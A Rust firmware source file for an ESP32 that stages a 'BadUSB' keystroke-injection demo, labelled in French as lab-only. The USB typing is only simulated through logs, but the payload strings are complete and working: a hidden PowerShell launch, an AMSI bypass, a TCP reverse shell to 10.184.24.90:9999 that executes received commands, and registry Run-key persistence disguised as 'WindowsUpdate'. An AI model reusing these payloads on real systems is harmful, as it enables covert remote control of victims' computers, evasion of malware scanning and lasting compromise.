use std::time::Duration;
use esp_idf_hal::delay::FreeRtos;
use log;

// Constants HID (USB Human Interface Device)
#[allow(dead_code)]
mod hid_keycodes {
    // Modifiers
    pub const MOD_LEFT_GUI: u8 = 0x08;
    
    // Keycodes (usage ID)
    pub const KEY_R: u8 = 0x15;
    pub const KEY_RETURN: u8 = 0x28;
}

pub struct UsbKeyboard;

impl UsbKeyboard {
    pub fn new() -> Result<Self, anyhow::Error> {
        log::info!("Initialisation clavier USB...");
        // TODO: Intégrer tinyusb ou usb-device ici
        Ok(UsbKeyboard)
    }
    
    pub fn press_key(&self, _key_code: u8) -> Result<(), anyhow::Error> {
        // Temporaire: simulation via logs
        log::info!("[SIMULATION] Touche pressée: code {}", _key_code);
        FreeRtos::delay_ms(80);
        Ok(())
    }
    
    pub fn slow_type(&self, text: &str, delay_ms: u64) -> Result<(), anyhow::Error> {
        for c in text.chars() {
            log::info!("[SIMULATION] Caractère tapé: '{}'", c);
            FreeRtos::delay_ms(delay_ms);
        }
        Ok(())
    }
    
    pub fn press_enter(&self) -> Result<(), anyhow::Error> {
        log::info!("[SIMULATION] Touche Enter pressée");
        FreeRtos::delay_ms(80);
        Ok(())
    }
}

pub fn run_badusb_demo() -> Result<(), anyhow::Error> {
    log::warn!("=== DÉMONSTRATION BADUSB (LAB UNIQUEMENT) ===");
    log::warn!("IP cible: 10.184.24.90:9999");
    log::warn!("⚠️ À exécuter UNIQUEMENT sur VM isolée ⚠️");
    
    let keyboard = UsbKeyboard::new()?;
    
    // Attente détection USB par l'hôte
    FreeRtos::delay_ms(3000);
    
    // Win+R
    log::info!("Ouverture de la boîte de dialogue Exécuter...");
    FreeRtos::delay_ms(1500);
    
    // Commande PowerShell
    let ps_cmd = "powershell -w h -ep b -nop";
    keyboard.slow_type(ps_cmd, 40)?;
    keyboard.press_enter()?;
    FreeRtos::delay_ms(4000);
    
    // Bypass AMSI
    let amsi_bypass = "$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');$b.SetValue($null,$true);";
    keyboard.slow_type(amsi_bypass, 40)?;
    keyboard.press_enter()?;
    FreeRtos::delay_ms(800);
    
    // Reverse shell
    let reverse_shell = "$c=New-Object Net.Sockets.TCPClient('10.184.24.90',9999);$s=$c.GetStream();$o=New-Object IO.StreamWriter($s);$o.AutoFlush=1;$o.WriteLine((whoami));[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$x=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$o.WriteLine((iex $x 2>&1|Out-String))}";
    keyboard.slow_type(reverse_shell, 40)?;
    keyboard.press_enter()?;
    FreeRtos::delay_ms(800);
    
    // Persistance
    let persistence = "$r=[Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\\Microsoft\\Windows\\CurrentVersion\\Run',$true);$r.SetValue('WindowsUpdate','powershell -w h -c \"$c=New-Object Net.Sockets.TCPClient(''10.184.24.90'',9999);$s=$c.GetStream();$o=New-Object IO.StreamWriter($s);$o.AutoFlush=1;while(1){{$o.WriteLine((iex (Read-Host) 2>&1|Out-String))}}\"');";
    keyboard.slow_type(persistence, 40)?;
    keyboard.press_enter()?;
    
    log::info!("Payload BadUSB exécuté (simulation terminée)");
    Ok(())
}